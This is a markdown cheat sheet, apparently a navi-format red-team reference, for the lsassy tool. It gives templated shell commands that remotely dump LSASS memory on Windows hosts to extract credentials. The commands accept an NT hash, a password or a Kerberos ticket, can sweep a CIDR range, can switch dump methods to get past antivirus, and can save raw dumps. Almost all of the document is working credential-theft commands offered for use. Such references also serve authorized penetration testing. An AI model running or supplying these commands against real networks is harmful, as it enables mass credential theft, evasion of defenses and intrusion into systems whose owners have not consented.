# Lsassy

Remote LSASS dumper - drops a dumper on the target, extracts the dump, parses it locally for credentials, and cleans up. No artifacts left on disk after run.

<!-- cheat
export lsassy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -H $credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

### single host

Dump LSASS on a single host and parse credentials locally.

```sh title:"Dump LSASS on one host, parse creds locally"
lsassy -d $domain -u $user $auth_flags $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
-->

### range / CIDR

Sweep an IP range, dumping LSASS wherever the creds work. Auto-skips unreachable hosts.

```sh title:"Sweep CIDR, dump LSASS where creds succeed"
lsassy -d $domain -u $user $auth_flags $cidr
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var cidr
-->

### specify dump method

Force a specific dumper (`comsvcs`, `procdump`, `dllinject`, `nanodump`, etc.) when the default is blocked by AV.

```sh title:"Force dump method when default is AV-blocked"
lsassy -d $domain -u $user $auth_flags -m $dump_method $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var dump_method = printf '%s\n' 'comsvcs' 'procdump' 'dllinject' 'nanodump' 'mirrordump' 'rdrleakdiag' --- --header 'Dump method'
-->

### keep raw dump

Save the raw LSASS dump alongside parsing - useful for offline pypykatz analysis if lsassy's parser misses something.

```sh title:"Save raw LSASS dump for offline pypykatz"
lsassy -d $domain -u $user $auth_flags -r --dumpfile $dump_path $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var dump_path
-->
